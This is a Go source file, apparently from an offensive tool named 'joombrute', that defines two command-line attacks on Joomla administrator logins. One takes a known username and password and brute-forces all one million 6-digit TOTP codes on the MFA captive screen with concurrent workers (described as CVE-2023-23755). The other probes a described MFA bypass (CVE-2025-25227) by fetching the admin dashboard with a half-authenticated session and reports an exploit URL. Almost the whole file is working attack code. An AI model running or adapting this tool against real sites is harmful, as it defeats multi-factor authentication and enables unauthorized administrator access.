package main

import (
	"context"
	"fmt"
	"os/signal"
	"syscall"
	"time"

	"github.com/rvzsec/joombrute/internal/httpx"
	"github.com/rvzsec/joombrute/internal/joomla"
	"github.com/rvzsec/joombrute/internal/mfa"
	"github.com/rvzsec/joombrute/internal/output"
	"github.com/spf13/cobra"
)

// --- mfa-brute (CVE-2023-23755) ------------------------------------------

type mfaBruteFlags struct {
	username       string
	password       string
	startAt        string
	endAt          string
	concurrency    int
	timeout        time.Duration
	backoff        time.Duration
	captiveOverride string
}

var mfbFlags mfaBruteFlags

func newMFABruteCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "mfa-brute",
		Short: "Brute the 6-digit TOTP captive screen (CVE-2023-23755, J4.2.0 - 4.3.1)",
		Long: `Exploit CVE-2023-23755 - the Joomla 4.2.0 - 4.3.1 captive MFA screen has no
rate limit. Given a known-good (username, password), exhaust the 6-digit
TOTP space (1,000,000 candidates) against /administrator/index.php?
option=com_users&view=captive.

This command performs an initial password POST itself to land on the
captive screen, then forks workers to spray codes.`,
		RunE: runMFABrute,
	}
	f := cmd.Flags()
	f.StringVar(&mfbFlags.username, "user", "", "Valid username (required)")
	f.StringVar(&mfbFlags.password, "password", "", "Valid password (required)")
	f.StringVar(&mfbFlags.startAt, "start", "000000", "First 6-digit code to try")
	f.StringVar(&mfbFlags.endAt, "end", "999999", "Last 6-digit code to try")
	f.IntVarP(&mfbFlags.concurrency, "concurrency", "c", 25, "Concurrent TOTP workers")
	f.DurationVar(&mfbFlags.timeout, "request-timeout", 10*time.Second, "Per-request timeout")
	f.DurationVar(&mfbFlags.backoff, "backoff", 3*time.Second, "Sleep after blocked response")
	f.StringVar(&mfbFlags.captiveOverride, "captive-url", "", "Override captive URL (skip the password POST)")
	return cmd
}

func runMFABrute(_ *cobra.Command, _ []string) error {
	if gflags.URL == "" {
		return fmt.Errorf("--url is required")
	}
	if mfbFlags.username == "" || mfbFlags.password == "" {
		return fmt.Errorf("--user and --password are required")
	}

	sink, closer := buildSink()
	defer closer()

	t, err := joomla.NewTarget(gflags.URL)
	if err != nil {
		return err
	}

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	// Source client - does the initial password POST so we can clone the
	// post-login session into each TOTP worker.
	srcClient, err := httpx.New(httpx.Config{
		Timeout:         mfbFlags.timeout,
		Proxy:           gflags.Proxy,
		UserAgent:       gflags.UserAgent,
		InsecureTLS:     gflags.InsecureTLS,
		FollowRedirects: false,
	})
	if err != nil {
		return err
	}

	captiveURL := mfbFlags.captiveOverride
	if captiveURL == "" {
		form, err := joomla.FetchLoginForm(ctx, srcClient, t)
		if err != nil {
			return fmt.Errorf("fetch login form: %w", err)
		}
		res, err := joomla.Attempt(ctx, srcClient, form, mfbFlags.username, mfbFlags.password)
		if err != nil {
			return fmt.Errorf("password POST: %w", err)
		}
		switch res.Outcome {
		case joomla.OutcomeMFARequired:
			captiveURL = res.CaptiveURL
			sink.Infof("password accepted, captive screen at %s - beginning TOTP brute", captiveURL)
		case joomla.OutcomeSuccess:
			sink.Hit(output.Hit{
				Target:   t.String(),
				Username: mfbFlags.username,
				Password: mfbFlags.password,
				Outcome:  "success",
				Note:     "no MFA enforced - direct admin access",
			})
			return nil
		default:
			return fmt.Errorf("password POST did not yield MFA captive (outcome=%s, status=%d, loc=%s)",
				res.Outcome, res.Status, res.Location)
		}
	}

	stats, err := mfa.BruteTOTP(ctx, mfa.TOTPBruteConfig{
		CaptiveURL:         captiveURL,
		CookieSourceClient: srcClient,
		Concurrency:        mfbFlags.concurrency,
		RequestTimeout:     mfbFlags.timeout,
		Proxy:              gflags.Proxy,
		UserAgent:          gflags.UserAgent,
		InsecureTLS:        gflags.InsecureTLS,
		StartAt:            mfbFlags.startAt,
		EndAt:              mfbFlags.endAt,
		BackoffBlocked:     mfbFlags.backoff,
		Sink:               sink,
		Target:             t.String(),
		Username:           mfbFlags.username,
	})
	if err != nil {
		return err
	}

	sink.Infof("done  attempted=%d  accepted=%d  blocked=%d  errors=%d  elapsed=%s  win=%s",
		stats.Attempted, stats.Accepted, stats.Blocked, stats.Errors, stats.Elapsed, stats.WinCode)
	return nil
}

// --- mfa-bypass (CVE-2025-25227) -----------------------------------------

type mfaBypassFlags struct {
	username       string
	password       string
	captiveURL     string
}

var mfxFlags mfaBypassFlags

func newMFABypassCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "mfa-bypass",
		Short: "Probe CVE-2025-25227 MFA bypass (J4.0.0 - 4.4.12, 5.0.0 - 5.2.5)",
		Long: `Probe the captive-screen state-check flaw described in CVE-2025-25227.

The captive view's "you must complete MFA" state is enforced on the view
itself rather than on the session. Direct-fetching com_cpanel with the
half-authenticated session lands on the dashboard on vulnerable versions.

This probe is non-destructive: it only GETs com_cpanel and classifies the
response. It does NOT mutate admin state.`,
		RunE: runMFABypass,
	}
	f := cmd.Flags()
	f.StringVar(&mfxFlags.username, "user", "", "Valid username (required if not using --captive-url)")
	f.StringVar(&mfxFlags.password, "password", "", "Valid password (required if not using --captive-url)")
	f.StringVar(&mfxFlags.captiveURL, "captive-url", "", "Use an existing captive URL (e.g. from a prior brute hit)")
	return cmd
}

func runMFABypass(_ *cobra.Command, _ []string) error {
	if gflags.URL == "" {
		return fmt.Errorf("--url is required")
	}
	if mfxFlags.captiveURL == "" && (mfxFlags.username == "" || mfxFlags.password == "") {
		return fmt.Errorf("either --captive-url or both --user and --password are required")
	}
	sink, closer := buildSink()
	defer closer()

	t, err := joomla.NewTarget(gflags.URL)
	if err != nil {
		return err
	}

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	client, err := httpx.New(httpx.Config{
		Timeout:         15 * time.Second,
		Proxy:           gflags.Proxy,
		UserAgent:       gflags.UserAgent,
		InsecureTLS:     gflags.InsecureTLS,
		FollowRedirects: false,
	})
	if err != nil {
		return err
	}

	captiveURL := mfxFlags.captiveURL
	if captiveURL == "" {
		form, err := joomla.FetchLoginForm(ctx, client, t)
		if err != nil {
			return fmt.Errorf("fetch login form: %w", err)
		}
		res, err := joomla.Attempt(ctx, client, form, mfxFlags.username, mfxFlags.password)
		if err != nil {
			return fmt.Errorf("password POST: %w", err)
		}
		if res.Outcome != joomla.OutcomeMFARequired {
			// Not an error - the bypass simply doesn't apply here.
			sink.Infof("target has no MFA enforced for this user (login outcome=%s) - CVE-2025-25227 not applicable",
				res.Outcome)
			return nil
		}
		captiveURL = res.CaptiveURL
	}

	result, err := mfa.ProbeCVE2025_25227(ctx, client, t.AdminURL(), captiveURL)
	if err != nil {
		return err
	}
	if result.Vulnerable {
		sink.Hit(output.Hit{
			Target:   t.String(),
			Username: mfxFlags.username,
			Outcome:  "mfa-bypass",
			Note:     "CVE-2025-25227 captive state-check bypass: " + result.Evidence,
		})
		sink.Infof("exploit URL: %s", result.ExploitURL)
	} else {
		sink.Infof("not vulnerable: %s", result.Evidence)
	}
	return nil
}
